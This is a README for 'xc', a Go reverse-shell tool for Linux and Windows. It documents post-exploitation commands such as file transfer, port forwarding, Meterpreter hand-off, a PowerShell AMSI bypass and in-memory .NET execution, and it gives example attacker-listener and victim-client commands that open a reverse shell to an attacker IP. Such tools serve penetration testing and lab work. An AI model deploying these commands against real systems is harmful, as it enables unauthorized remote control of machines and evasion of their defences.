# xc

Netcat like reverse shell for Linux & Windows. This is/was my project for learning golang so expect some bugs.

## Features

### Windows

```  
Usage:
└ Shared Commands:  !exit
  !upload <src> <dst>
   * uploads a file to the target
  !download <src> <dst>
   * downloads a file from the target
  !lfwd <localport> <remoteaddr> <remoteport>
   * local portforwarding (like ssh -L)
  !rfwd <remoteport> <localaddr> <localport>
   * remote portforwarding (like ssh -R)
  !lsfwd
   * lists active forwards
  !rmfwd <index>
   * removes forward by index
  !plugins
   * lists available plugins
  !plugin <plugin>
   * execute a plugin
  !spawn <port>
   * spawns another client on the specified port
  !shell
   * runs /bin/sh
  !runas <username> <password> <domain>
   * restart xc with the specified user
  !met <port>
   * connects to a x64/meterpreter/reverse_tcp listener
└ OS Specific Commands:
  !powershell
    * starts powershell with AMSI Bypass
  !rc <port>
    * connects to a local bind shell and restarts this client over it
  !runasps <username> <password> <domain>
    * restart xc with the specified user using powershell
  !vulns
    * checks for common vulnerabilities
  !net <sample.exe> <arg1> <arg2> ...
    * Uploads & Runs a .NET assembly from memory
``` 

### Linux

```
Usage:
└ Shared Commands:  !exit
  !upload <src> <dst>
   * uploads a file to the target
  !download <src> <dst>
   * downloads a file from the target
  !lfwd <localport> <remoteaddr> <remoteport>
   * local portforwarding (like ssh -L)
  !rfwd <remoteport> <localaddr> <localport>
   * remote portforwarding (like ssh -R)
  !lsfwd
   * lists active forwards
  !rmfwd <index>
   * removes forward by index
  !plugins
   * lists available plugins
  !plugin <plugin>
   * execute a plugin
  !spawn <port>
   * spawns another client on the specified port
  !shell
   * runs /bin/sh
  !runas <username> <password> <domain>
   * restart xc with the specified user
  !met <port>
   * connects to a x64/meterpreter/reverse_tcp listener
└ OS Specific Commands:
 !ssh <port>
   * starts sshd with the configured keys on the specified port
``` 

## Examples

- Linux Attacker:	  `rlwrap xc -l -p 1337`			(Server)
- WindowsVictim :   `xc.exe 10.10.14.4 1337`	  (Client)
- Argumentless:     `xc_10.10.14.4_1337.exe`    (Client)

## Setup

Make sure you are running golang version 1.15+, older versions will not compile.

``` 
go get golang.org/x/sys/windows
go get golang.org/x/text/encoding/unicode
go get github.com/hashicorp/yamux
go get github.com/ropnop/go-clr
pip3 install donut-shellcode
sudo apt-get install rlwrap
``` 

Linux:
```
make
```

## Known Issues

* When !lfwd fails due to lack of permissions (missing sudo), the entry in !lsfwd is still created
* Can't Ctrl+C out of powershell started from !shell

## Credits

* Included PrivescCheck by itm4n for windows clients: https://github.com/itm4n/PrivescCheck  